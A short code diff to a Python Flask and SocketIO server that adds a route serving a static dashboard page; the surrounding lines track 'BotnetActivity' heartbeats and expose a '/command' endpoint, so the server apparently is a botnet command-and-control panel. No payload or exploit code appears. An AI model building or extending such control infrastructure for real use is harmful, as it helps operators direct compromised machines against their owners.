@@ -1,6 +1,6 @@
 import time
 from typing import Dict, List
-from flask import Flask, request, send_file, render_template
+from flask import Flask, request, send_file, render_template, send_from_directory
 from flask_socketio import SocketIO, emit
 from flask_cors import CORS, cross_origin
 import jsonpickle
@@ -39,6 +39,10 @@ def heartbeat(data):
     else:
         botnets.append(BotnetActivity(data['uuid'], data['running']))
 
+
+@app.route('/', methods=["GET"])
+def send_dashboard():
+    return send_from_directory('static', 'dashboard.html')
 
 @app.route('/command', methods=["POST"])
 def send_command():
